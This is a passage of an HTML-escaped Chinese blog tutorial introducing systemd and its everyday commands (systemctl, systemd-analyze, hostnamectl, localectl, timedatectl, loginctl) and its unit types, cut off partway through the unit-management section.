&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;systemvinit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;upstart，就是常见的/etc/init.d下的脚本&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;systemd，一代更比一代强，这就是我们接下来要介绍的。在CoreOS,ubuntu15.04及以上版本中有使用。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;Systemd概述&quot;&gt;&lt;a href=&quot;#Systemd概述&quot; class=&quot;headerlink&quot; title=&quot;Systemd概述&quot;&gt;&lt;/a&gt;Systemd概述&lt;/h1&gt;&lt;p&gt;Systemd 的设计目标是，为系统的启动和管理提供一套完整的解决方案。&lt;br&gt;根据 Linux 惯例，字母d是守护进程（daemon）的缩写。 Systemd 这个名字的含义，就是它要守护整个系统。&lt;br&gt;使用了 Systemd，就不需要再用init了。Systemd 取代了initd，成为系统的第一个进程（PID 等于 1），其他进程都是它的子进程。&lt;br&gt;它的优点是启动更迅速，更便于管理进程。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl --version&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上面的命令查看 Systemd 的版本。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.ruanyifeng.com/blogimg/asset/2016/bg2016030703.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;（上图为 Systemd 架构图）&lt;/p&gt;
&lt;h1 id=&quot;系统管理&quot;&gt;&lt;a href=&quot;#系统管理&quot; class=&quot;headerlink&quot; title=&quot;系统管理&quot;&gt;&lt;/a&gt;系统管理&lt;/h1&gt;&lt;p&gt;Systemd 并不是一个命令，而是一组命令，涉及到系统管理的方方面面。&lt;/p&gt;
&lt;h2 id=&quot;systemctl&quot;&gt;&lt;a href=&quot;#systemctl&quot; class=&quot;headerlink&quot; title=&quot;systemctl&quot;&gt;&lt;/a&gt;systemctl&lt;/h2&gt;&lt;p&gt;systemctl是 Systemd 的主命令，用于管理系统。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 重启系统&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl reboot&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 关闭系统，切断电源&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl poweroff&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# CPU停止工作&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl halt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 暂停系统&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl suspend&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 让系统进入冬眠状态&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl hibernate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 让系统进入交互式休眠状态&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl hybrid-sleep&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 启动进入救援状态（单用户状态）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl rescue&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;systemd-analyze&quot;&gt;&lt;a href=&quot;#systemd-analyze&quot; class=&quot;headerlink&quot; title=&quot;systemd-analyze&quot;&gt;&lt;/a&gt;systemd-analyze&lt;/h2&gt;&lt;p&gt;systemd-analyze命令用于查看启动耗时。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 查看启动耗时&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemd-analyze                                                                                       &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 查看每个服务的启动耗时&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemd-analyze blame&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 显示瀑布状的启动过程流&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemd-analyze critical-chain&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 显示指定服务的启动流&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemd-analyze critical-chain atd.service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;hostnamectl&quot;&gt;&lt;a href=&quot;#hostnamectl&quot; class=&quot;headerlink&quot; title=&quot;hostnamectl&quot;&gt;&lt;/a&gt;hostnamectl&lt;/h2&gt;&lt;p&gt;hostnamectl命令用于查看当前主机的信息。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 显示当前主机的信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ hostnamectl&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 设置主机名。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo hostnamectl set-hostname rhel7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;localectl&quot;&gt;&lt;a href=&quot;#localectl&quot; class=&quot;headerlink&quot; title=&quot;localectl&quot;&gt;&lt;/a&gt;localectl&lt;/h2&gt;&lt;p&gt;localectl命令用于查看本地化设置。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 查看本地化设置&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ localectl&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 设置本地化参数。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo localectl set-locale LANG=en_GB.utf8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo localectl set-keymap en_GB&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;timedatectl&quot;&gt;&lt;a href=&quot;#timedatectl&quot; class=&quot;headerlink&quot; title=&quot;timedatectl&quot;&gt;&lt;/a&gt;timedatectl&lt;/h2&gt;&lt;p&gt;timedatectl命令用于查看当前时区设置。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 查看当前时区设置&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ timedatectl&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 显示所有可用的时区&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ timedatectl list-timezones                                                                                   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 设置当前时区&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo timedatectl set-timezone America/New_York&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo timedatectl set-time YYYY-MM-DD&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo timedatectl set-time HH:MM:SS&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;loginctl&quot;&gt;&lt;a href=&quot;#loginctl&quot; class=&quot;headerlink&quot; title=&quot;loginctl&quot;&gt;&lt;/a&gt;loginctl&lt;/h2&gt;&lt;p&gt;loginctl命令用于查看当前登录的用户。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 列出当前session&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ loginctl list-sessions&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 列出当前登录用户&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ loginctl list-users&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 列出显示指定用户的信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ loginctl show-user ruanyf&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;Until&quot;&gt;&lt;a href=&quot;#Until&quot; class=&quot;headerlink&quot; title=&quot;Until&quot;&gt;&lt;/a&gt;Until&lt;/h1&gt;&lt;h2 id=&quot;含义&quot;&gt;&lt;a href=&quot;#含义&quot; class=&quot;headerlink&quot; title=&quot;含义&quot;&gt;&lt;/a&gt;含义&lt;/h2&gt;&lt;p&gt;Systemd 可以管理所有系统资源。不同的资源统称为 Unit（单位）。&lt;br&gt;Unit 一共分成12种。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Service unit：系统服务&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Target unit：多个 Unit 构成的一个组&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Device Unit：硬件设备&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Mount Unit：文件系统的挂载点&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Automount Unit：自动挂载点&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Path Unit：文件或路径&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Scope Unit：不是由 Systemd 启动的外部进程&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Slice Unit：进程组&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Snapshot Unit：Systemd 快照，可以切回某个快照&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Socket Unit：进程间通信的 socket&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Swap Unit：swap 文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Timer Unit：定时器&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;systemctl list-units&lt;/code&gt;命令可以查看当前系统的所有 Unit 。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 列出正在运行的 Unit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl list-units&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 列出所有Unit，包括没有找到配置文件的或者启动失败的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl list-units --all&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 列出所有没有运行的 Unit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl list-units --all --state=inactive&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 列出所有加载失败的 Unit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl list-units --failed&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 列出所有正在运行的、类型为 service 的 Unit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl list-units --type=service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Unit的状态&quot;&gt;&lt;a href=&quot;#Unit的状态&quot; class=&quot;headerlink&quot; title=&quot;Unit的状态&quot;&gt;&lt;/a&gt;Unit的状态&lt;/h2&gt;&lt;p&gt;&lt;code&gt;systemctl status&lt;/code&gt;命令用于查看系统状态和单个 Unit 的状态。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 显示系统状态&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl status&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 显示单个 Unit 的状态&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sysystemctl status bluetooth.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 显示远程主机的某个 Unit 的状态&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl -H root@rhel7.example.com status httpd.service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;除了&lt;code&gt;status&lt;/code&gt;命令，&lt;code&gt;systemctl&lt;/code&gt;还提供了三个查询状态的简单方法，主要供脚本内部的判断语句使用。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 显示某个 Unit 是否正在运行&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl is-active application.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 显示某个 Unit 是否处于启动失败状态&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl is-failed application.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 显示某个 Unit 服务是否建立了启动链接&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl is-enabled application.service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Unit管理&quot;&gt;&lt;a href=&quot;#Unit管理&quot; class=&quot;headerlink&quot; title=&quot;Unit管理&quot;&gt;&lt;/a&gt;Unit管理&lt;/h2&gt;&lt;p&gt;对于用户来说，最常用的是下面这些命令，用于启动和停止 Unit（主要是 service）。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span 